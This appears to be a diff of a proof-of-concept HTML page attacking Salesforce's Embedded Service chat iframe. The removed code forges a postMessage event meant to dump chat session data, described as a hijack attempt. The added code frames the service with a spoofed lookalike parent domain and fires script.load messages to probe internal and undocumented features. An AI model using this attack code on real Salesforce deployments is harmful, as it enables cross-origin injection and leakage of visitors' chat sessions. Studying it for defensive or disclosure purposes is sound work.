@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce Message Injection PoC</title>
+  <title>Salesforce Feature Loader PoC</title>
 </head>
 <body>
-  <h2>Salesforce LiveAgent iframe injection PoC</h2>
+  <h2>Salesforce script.load Feature Probe (v4.0)</h2>
 
   <iframe
     id="eswFrame"
-    src="https://help.salesforce.com/s/articleView?id=service.live_agent_intro.htm&type=5"
+    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
     style="width:600px;height:400px;"
     onload="onIframeLoad()"
     allow="camera *; microphone *;">
@@ -17,41 +17,42 @@
   <script>
     const iframe = document.getElementById("eswFrame");
 
-    window.addEventListener("message", (e) => {
-      console.log("📩 Message from iframe:", e.data);
-    });
+    const features = [
+      "chasitor",
+      "filetransfer",
+      "prechat",
+      "bootstrap",
+      "routing",
+      "channels",
+      "messageEvents",
+      "customButtons",
+      "proactive",         // observed in some orgs
+      "metrics",           // used for analytics
+      "journeyEvents",     // undocumented, sometimes seen
+      "snapinsStarter",    // seen in early initialization
+      "sidebar"            // UI-related in some builds
+    ];
 
-    function sendFakeEvent() {
-      console.log("📤 Sending fake event to dump session info");
-      iframe.contentWindow.postMessage({
-        method: "liveagent.event",
-        data: {
-          event: "chasitorDataDump",
-          params: {
-            key: "POC",
-            value: "Response hijack attempt"
-          },
-          chasitorData: {
-            orgId: "00Dxx0000000000",
-            chatKey: "FAKEKEY123",
-            visitorInfo: {
-              name: "Victim",
-              location: "internal"
-            }
-          }
-        }
-      }, "*");
-    }
+    window.addEventListener("message", (e) => {
+      if (e.origin.includes("force.com") && e.data?.method === "script.load") {
+        console.log(`📩 Loaded feature: ${e.data.feature}`);
+      } else {
+        console.log("📩 Message from iframe:", e.data);
+      }
+    });
 
     function onIframeLoad() {
       console.log("[+] Iframe loaded (Salesforce 4.0)");
 
-      // Load internal scripts
-      iframe.contentWindow.postMessage({ method: "script.load", feature: "chasitor" }, "*");
-      iframe.contentWindow.postMessage({ method: "script.load", feature: "filetransfer" }, "*");
-
-      // Delay to give time for handlers to bind
-      setTimeout(sendFakeEvent, 1500);
+      features.forEach((feature, i) => {
+        setTimeout(() => {
+          console.log(`📤 Sending script.load for: ${feature}`);
+          iframe.contentWindow.postMessage({
+            method: "script.load",
+            feature: feature
+          }, "*");
+        }, i * 400); // staggered to avoid race or overwrite
+      });
     }
   </script>
 </body>
